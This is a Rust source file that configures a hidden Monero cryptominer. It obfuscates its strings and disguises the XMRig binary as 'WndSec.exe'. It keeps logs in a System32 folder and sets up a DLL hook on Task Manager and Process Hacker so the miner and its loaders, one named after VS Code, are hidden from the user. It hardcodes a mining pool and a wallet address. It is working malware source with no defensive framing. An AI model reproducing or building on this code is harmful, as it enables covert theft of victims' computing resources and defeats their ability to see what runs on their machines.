use std::path::PathBuf;
use obfstr::obfstr as s;
use shared::{
    constants::{ client_exe_name, system_loader_exe_name, vscode_initial_loader_exe_name },
    utils::functions::{ programdata_dir, system32_dir },
};

pub fn log_directory() -> PathBuf {
    system32_dir().join(s!("sppn"))
}

pub fn default_query_hook_exclusions() -> Vec<String> {
    vec![
        xmrig_exe_name(),
        vscode_initial_loader_exe_name(),
        system_loader_exe_name(),
        client_exe_name()
    ]
}

pub fn query_hook_processes() -> Vec<String> {
    vec![s!("taskmgr.exe").to_owned(), s!("processhacker.exe").to_owned()]
}

pub fn query_hook_exclusions_file_path() -> PathBuf {
    programdata_dir().join(s!("cwl")).join(s!("c")).join(s!("incl.t"))
}

pub fn query_hook_dll_name() -> String {
    s!("lib.dll").to_owned()
}

pub fn client_version() -> u64 {
    2
}
pub fn xmrig_exe_name() -> String {
    s!("WndSec.exe").to_owned()
}

pub fn default_xmrig_pool() -> String {
    s!("gulf.moneroocean.stream:10128").to_owned()
}
pub fn default_monero_wallet() -> String {
    s!(
        "86wcYJgsuLFhXFutDvs4wn4EoMnFojCUEUxqz7HVr51SZSRP4YrsiDMRBHcRkn5LQvAEj8E9CqztEMLy3j5Zhq9VRdDZ1FQ"
    ).to_owned()
}
